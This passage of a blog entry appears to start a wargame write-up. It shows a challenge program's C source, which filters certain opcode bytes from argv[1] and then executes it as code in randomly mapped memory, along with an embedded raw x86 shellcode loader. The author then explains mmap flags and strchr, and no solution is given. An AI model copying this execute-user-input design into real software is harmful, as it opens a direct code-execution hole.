-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">#define LOADERSIZE (232 + 16)</span>
-</span><span class='line'><span class="kt">void</span><span class="o">*</span> <span class="nf">getASLRregion</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
-</span><span class='line'><span class="kt">void</span> <span class="nf">switchcontext</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">newstack</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">code</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">env</span><span class="p">[])</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">newcode</span><span class="p">,</span> <span class="o">*</span><span class="n">newstack</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="c1">//allocate memory at random addresses</span>
-</span><span class='line'>  <span class="n">newstack</span> <span class="o">=</span> <span class="n">getASLRregion</span><span class="p">(</span><span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="p">);</span>
-</span><span class='line'>  <span class="n">newcode</span> <span class="o">=</span>  <span class="n">getASLRregion</span><span class="p">(</span><span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strchr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0xcd</span><span class="p">))</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strchr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0xe8</span><span class="p">))</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;</span><span class="se">\x0F\x34</span><span class="s">&quot;</span><span class="p">))</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strchr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0xdb</span><span class="p">))</span> <span class="p">{</span>
-</span><span class='line'>      <span class="c1">//prepare new code section, leaving some space for a loader</span>
-</span><span class='line'>      <span class="n">strncpy</span><span class="p">(</span><span class="n">newcode</span> <span class="o">+</span> <span class="n">LOADERSIZE</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">1000</span><span class="p">);</span>
-</span><span class='line'>      
-</span><span class='line'>      <span class="c1">//start executing using a new stack and code section.</span>
-</span><span class='line'>      <span class="n">switchcontext</span><span class="p">(</span><span class="n">newstack</span> <span class="o">+</span> <span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">newcode</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'><span class="cm">/*************************************************************************************************************************/</span>
-</span><span class='line'><span class="cm">/* HALT! The code below only provides a controllable aslr/noexec for this challenge, there&#39;s no need to waste time on it */</span>
-</span><span class='line'><span class="cm">/*************************************************************************************************************************/</span>
-</span><span class='line'><span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span><span class="n">initializePRNG</span><span class="p">(){</span><span class="kt">int</span> <span class="n">seed</span><span class="p">;</span><span class="kt">FILE</span><span class="o">*</span><span class="n">devrand</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s">&quot;/dev/random&quot;</span><span class="p">,</span><span class="s">&quot;r&quot;</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="n">devrand</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
-</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">seed</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">devrand</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span><span class="n">fclose</span><span class="p">(</span><span class="n">devrand</span><span class="p">);</span><span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);}</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">loader</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mh">0xe899c031</span><span class="p">,</span><span class="mi">0</span><span class="p">};</span><span class="kt">void</span><span class="o">*</span>
-</span><span class='line'><span class="nf">getASLRregion</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">){</span><span class="kt">int</span> <span class="n">tries</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span><span class="n">hint</span><span class="p">,</span><span class="n">res</span><span class="p">;</span><span class="k">while</span><span class="p">(</span><span class="n">tries</span><span class="o">--</span><span class="p">){</span><span class="n">hint</span><span class="o">=</span><span class="n">rand</span><span class="p">()</span><span class="o">&lt;&lt;</span><span class="mi">12</span><span class="p">;</span><span class="n">res</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">hint</span><span class="p">,</span><span class="n">size</span>
-</span><span class='line'><span class="o">+</span><span class="mi">4096</span><span class="p">,</span><span class="n">flags</span><span class="p">,</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="n">hint</span><span class="o">==</span><span class="n">res</span><span class="p">){</span><span class="n">loader</span><span class="p">[</span><span class="o">++</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="n">hint</span><span class="p">;</span><span class="k">return</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">res</span><span class="o">+</span><span class="p">(</span><span class="n">rand</span><span class="p">()</span><span class="o">&amp;</span><span class="mh">0xffc</span><span class="p">));}</span>
-</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">munmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">res</span><span class="p">,</span><span class="n">size</span><span class="o">+</span><span class="mi">4096</span><span class="p">))</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span><span class="kt">void</span> <span class="nf">switchcontext</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="n">newstack</span><span class="p">,</span><span class="kt">char</span><span class="o">*</span><span class="n">code</span><span class="p">){</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">&lt;&lt;=</span><span class="mi">2</span><span class="p">;</span><span class="n">memcpy</span><span class="p">(</span><span class="n">code</span>
-</span><span class='line'><span class="p">,</span><span class="n">loader</span><span class="p">,</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">);</span><span class="n">memcpy</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\x68\x61\x70\x73\x00\x68\x6c\x66\x2f\x6d\x68\x63\x2f\x73\x65\x68\x2f\x70</span><span class="s">&quot;</span>
-</span><span class='line'><span class="s">&quot;</span><span class="se">\x72\x6f\x89\xe3\x89\xc1\xb0\x05\xcd\x80\x81\xc4\x10\x00\x00\x00\x85\xc0\x0f\x88\x97\x00\x00\x00\x50\x89\xe5\x31\xc9\x31</span><span class="s">&quot;</span>
-</span><span class='line'><span class="s">&quot;</span><span class="se">\xff\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x73\x00\x00\x00\x85\xc0\x0f\x84\x80\x00\x00\x00\x80\xf9\x2d\x74\x10\x80\xe9\x30</span><span class="s">&quot;</span>
-</span><span class='line'><span class="s">&quot;</span><span class="se">\x80\xf9\x09\x76\xde\x80\xe9\x27\xe9\xd6\xff\xff\xff\x8b\x75\x04\xad\x39\xf8\x74\x3b\x85\xc0\x75\xf7\x57\x31\xc9\x31\xff</span><span class="s">&quot;</span>
-</span><span class='line'><span class="s">&quot;</span><span class="se">\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x38\x00\x00\x00\x85\xc0\x74\x49\x80\xf9\x20\x74\x10\x80\xe9\x30\x80\xf9\x09\x76\xe2</span><span class="s">&quot;</span>
-</span><span class='line'><span class="s">&quot;</span><span class="se">\x80\xe9\x27\xe9\xda\xff\xff\xff\x5b\x89\xf9\x29\xd9\x31\xc0\x99\xb0\x7d\xcd\x80\xe8\x0e\x00\x00\x00\x85\xc0\x74\x1f\x80</span><span class="s">&quot;</span>
-</span><span class='line'><span class="s">&quot;</span><span class="se">\xf9\x0a\x75\xf2\xe9\x7c\xff\xff\xff\x51\x89\xe1\x31\xc0\x99\xb0\x03\x42\x8b\x5d\x00\xcd\x80\x59\xc3\x31\xc0\x40\xcd\x80</span><span class="s">&quot;</span>
-</span><span class='line'><span class="s">&quot;</span><span class="se">\x31\xc0\xb0\x06\x5b\xcd\x80\x31\xc0\x5b\x31\xc9\xb1\x10\xfd\x89\xe7\xf3\xab\xfc\x8d\x7b\xf8\xb1\x3d\x99\x31\xdb\x31\xf6</span><span class="s">&quot;</span>
-</span><span class='line'><span class="s">&quot;</span><span class="se">\xf3\xab\x31\xff</span><span class="s">&quot;</span><span class="p">,</span><span class="n">LOADERSIZE</span><span class="o">-</span><span class="mi">16</span><span class="p">);</span><span class="n">asm</span><span class="p">(</span><span class="s">&quot;mov %0, %%esp</span><span class="se">\n</span><span class="s">mov %1,%%eax</span><span class="se">\n</span><span class="s">jmp *%%eax&quot;</span><span class="o">::</span><span class="s">&quot;r&quot;</span><span class="p">(</span><span class="n">newstack</span><span class="o">-</span><span class="mi">4</span><span class="p">),</span><span class="s">&quot;r&quot;</span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="o">:</span><span class="s">&quot;eax&quot;</span><span class="p">);}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Function overview</h4>
-
-<p>Well, let&rsquo;s first be clear on the flags used for the memory allocation:</p>
-
-<p>PROT_EXEC  Pages may be executed.</p>
-
-<p>PROT_READ  Pages may be read.</p>
-
-<p>PROT_WRITE Pages may be written.</p>
-
-<p><strong>strchr</strong></p>
-
-<p><em>char <em>strchr(const char </em>str, int ch);</em></p>
-
-<p>Returns a pointer to the first occurrence of character ch in str or a null pointer if no matching character is found.</p>
-
-<p>The terminating null byte is considered part of the string, so that if  ch  is  specified  as &lsquo;\0&rsquo;, this function returns a pointer to the terminator.</p>
-
-<p>I will come back to this at a later time.</p>
-
-<blockquote><p>Truth is the most valuable thing we have &mdash; so let us economize it.</p>
-
-<p>&mdash; Mark Twain</p></blockquote>
 ]]></content>
   </entry>
   
